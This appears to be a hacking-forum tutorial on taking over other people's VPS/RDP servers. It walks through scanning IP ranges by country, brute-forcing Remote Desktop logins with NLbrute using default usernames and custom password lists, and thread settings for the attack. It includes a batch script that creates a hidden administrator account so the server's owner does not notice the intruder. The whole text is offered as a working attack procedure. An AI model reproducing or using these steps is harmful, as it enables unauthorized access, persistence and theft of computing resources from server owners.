WHAT IS A VPS/RDP AND WHAT IS USE FOR

 

A Virtual Private Server (VPS) is a virtual machine sold as a service by an Internet hosting service. A VPS runs its own copy of an operating system (OS), and customers may have superuser-level access to that operating system instance, so they can install almost any software that runs on that OS.

 

why we need to use them?!

 

when you try to crack some accounts on your own PC, you need to wait a lot of time and you need fast internet and traffic and more issues

like when you try to user cracking with SentryMBA may this take about 1 day to check all of the passwords! and it's same about VPS cracking!

and also VPS are stronger, faster, and more acceptable that home PC!



 

WHAT TOOL IS RECOMMENDED TO USE?!

 

Actually, for connecting to a VPS, you need the VPS IP address, User, and Password! and you should connect them with REMOTE DESKTOP CONNECTION (search on windows search bar)

 

THIS IS A QUESTION'S!

 

HOW TO GET IP ADDRESSES?!

 

you can get them by using site's below and you need to scan them with Kport Scan for each country!

 

FOR SPECIFIC COUNTRY


https://www.countryi...y_selection.php

FOR SPECIFIC DATACENTER!

https://myip.ms/

HOW TO GET USERS?!

most data centers use public users for their VPS

the most users:

admin

                                                                         administrator (can be different from the country language!)

user

guest

 

HOW TO GET PASSWORDS?!

 

you must make the password list on your own! and it's linked to your creativity! and of course experience



HOW WE CAN CRACK VPS/RDP'S?


after getting IP ranges and scan them! you need to make the password list! and it's different for each country!

 

1- open up NLbrute

2- Set Thread by this setting:

âœ… SETTING THREAD IN NLBRUTE BY SERVER POWER âœ…

 

IF PPS WAS UNDER 25, THREAD SHOULD BE 10

IF PPS WAS UNDER 40, THREAD SHOULD BE 200

IF PPS WAS UNDER 70, THREAD SHOULD BE 300

IF PPS WAS Between 90 to 100, THREAD SHOULD BE 400

IF PPS WAS BETWEEN 120 TO 200, THREAD SHOULD BE 500

IF PPS WAS BETWEEN 200 TO 300, THREAD SHOULD BE 600

IF PPS WAS BETWEEN 300 TO 400, THREAD SHOULD BE 700

IF PPS WAS BETWEEN 400 TO 500, THREAD SHOULD BE 800

IF PPS WAS HIGHER THAN 500, THREAD SHOULD BE 1000

IF PPS WAS HIGHER THAN 700, THREAD SHOULD BE 1200

3- load your PasswordList

4- load your Scanned IP ranges

5- load your Users!

6- Start Cracking! (it takes a lot of time something like 23H, and it's not easy)



 

WHAT WE'RE GONNA DO FIRST WHEN WE GET HITS?!

 

1- Connect to VPS with Remote Desktop Connection

2- Going to! WebBrowser and go to History! if you find anything it means that someone uses this VPS! and you need to make a hidden user! so The builder will not notice your presence!
3-writethis commands on a notepad and save it as the .bat file! so when you open this bat file this make a hidden user on your VPS!

cd\
cls

REM"vps hide use creator"

REM------------------------------

@echo off

set /p user=PLS INSERT YOUR USERNAME:

set /p pass=PLS INSERT YOUR PASSWORD:

net user/add %user% %pass%

net localgroup administrators/add %user%

reg add"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0

pause


4- go to task manager and performance and look at uptime! if it was low, you don't need to be a worry! no one uses this VPS before you!



HOW TO WRITE A PASSWORD LIST?!


 

this is an important part! you need a powerful password list to crack VPS!

 

for making that you need to pay attention and be patient! cause it takes time!

 

 

we have many types of password list! like name, location, car name, random numbers, and more!

 

 

for example! you want to crack Germany datacenters! you should make a password list by using their famous place's names and more! or, you can use public passwords like admin, password123, numbers and more ...

 

 

 

admin123

 

admin@pruned_19242052

 

admin#123

 

~admin_123

 

admin_2018

 

admin_2017

 

admin__!@#

 

!admin!

 

 

and more ...

 

 

Berlin123

 

Berlin@pruned_19242052

 

Berlin#123

 

~Berlin12$

 

Berlin100%

 

Berlin_12#

 

 

for Russians use their language for password and also users!
